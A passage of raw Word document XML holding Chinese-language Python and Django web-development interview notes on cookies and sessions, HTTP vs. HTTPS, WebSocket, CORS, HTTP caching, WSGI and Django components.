          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>如果不想使用更加强大的功能，可仅仅使用常规的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>function-based views</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>额外的文档和强大的社区支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2C270B"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2.19 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>的了解？他们能单独用吗？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4C758C" w14:textId="57239084" w:rsidR="00F378B5" w:rsidRPr="00F378B5" w:rsidRDefault="00191162" w:rsidP="00F378B5">
      <w:pPr>
        <w:pStyle w:val="a7"/>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lastRenderedPageBreak/>
        <w:t>Session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>采用的是在服务器端保持状态的方案，而</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>采用的是在客户端保持状态的方案。但是禁用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>就不能得到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>。因为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Session ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>来确定当前对话所对应的服务器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>，而</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Session ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>是通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>来传递的，禁用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>相当于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>SessionID,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>也就得不到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>Session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348E5D06" w14:textId="68BE7C70" w:rsidR="00191162" w:rsidRPr="00F378B5" w:rsidRDefault="00F378B5" w:rsidP="00F378B5">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>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sidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>是一个事件存储在客户端（浏览器），</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Session</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>是一个对象存储在服务端；</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Session</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>依赖于</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，用户每次请求服务器请求头都会携带</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中保存了</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>标识符，服务器通过该标识符获取到跟请求对应的</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="003465FC">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549379A8"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http和https的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38AF1100"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1、https协议需要到ca申请证书，一般免费证书较少，因而需要一定费用。 2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。 3、http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。 4、http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2C0737"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简述websocket协议及实现原理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471D9721" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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WebSocket用于在Web浏览器和服务器之间进行任意的双向数据传输的一种技术。WebSocket协议基于TCP协议实现，包含初始的握手过程，以及后续的多次数据帧双向传输过程。其目的是在WebSocket应用和WebSocket服务器进行频繁双向通信时，可以使服务器避免打开多个HTTP连接进行工作来节约资源，提高了工作效率和资源利用率。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553BB823"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django中如何实现websocket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F13E6D0" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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通过使用channels模块来实现</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698A9A11"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python web开发中跨域问题的解决思路</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05457C95" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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使用django-cors-headers模块，给跨域增加忽略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C92403" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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使用jsonp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="207776A9" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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修改对应的api实现函数views.py，允许其他域通过ajax请求数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220FF6A1" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="000F657C" w:rsidRDefault="00191162"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b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>简述</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>缓存机制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59755208" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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对于强制缓存，服务器通知浏览器一个缓存时间，在缓存时间内，下次请求，直接用缓存，不在时间内，执行比较缓存策略。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D8EB0E" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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对于比较缓存，将缓存信息中的Etag和Last-Modified通过请求发送给服务器，由服务器校验，返回304状态码时，浏览器直接使用缓存。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BE2C04" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="000F657C" w:rsidRDefault="00191162"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b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>什么是</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wsgi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AAB4435" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>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WSGI是Python在处理HTTP请求时，规定的一种处理方式。如一个HTTP Request过来了，那么就有一个相应的处理函数来进行处理和返回结果。WSGI就是规定这个处理函数的参数长啥样的，它的返回结果是长啥样的？至于该处理函数的名子和处理逻辑是啥样的，那无所谓。简单而言，WSGI就是规定了处理函数的输入和输出格式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47648C48" w14:textId="5F122583"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hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>16</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列举</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的内置组件</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="776676A0"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.Admin</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是对</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中对应的数据表进行增删改查提供的组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E1DB7A"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.model</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>组件：负责操作数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63AD9AD4"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.form</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>组件：</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>生成</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>代码</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>数据有效性校验</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>校验信息返回并展示</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1619AA1C"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.ModelForm</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>组件即用于数据库操作</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也可用于用户请求的验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719FA7A5" w14:textId="7BA25A9E"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b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>017</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请求的生命周期</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14EF5CFB"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当用户在浏览器中输入</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>时</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浏览器会生成请求头和请求体发给服务端</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求头和请求体中会包含浏览器的动作</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(action),</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个动作通常为</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>或者</w:t>
      </w:r>
